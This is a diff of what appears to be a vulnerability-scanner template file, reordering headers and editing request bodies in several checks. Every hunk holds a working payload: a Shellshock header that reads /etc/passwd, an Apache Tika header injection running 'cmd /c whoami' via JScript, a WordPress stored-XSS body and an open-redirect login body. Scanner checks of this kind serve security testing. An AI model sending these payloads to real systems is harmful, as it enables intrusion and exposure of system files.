@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6284,11 +6284,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -6786,7 +6786,7 @@
       },
       "requests": [
         {
-          "body": "icl_post_action=save_theme_localization&locale_file_name_en=EN\"><script>alert(0);</script>",
+          "body": "icl_post_action=save_theme_localization&locale_file_name_en=EN\"><script>alert(0);</script>\n",
           "method": "POST",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php"
@@ -8020,7 +8020,7 @@
       },
       "requests": [
         {
-          "body": "success=%2Fshare%2Fpage%2F&failure=:\\\\google.com&username=baduser&password=badpass",
+          "body": "success=%2Fshare%2Fpage%2F&failure=:\\\\example.com&username=baduser&password=badpass\n",
           "headers": {
             "Content-Type": "application/x-www-form-urlencoded"
           },
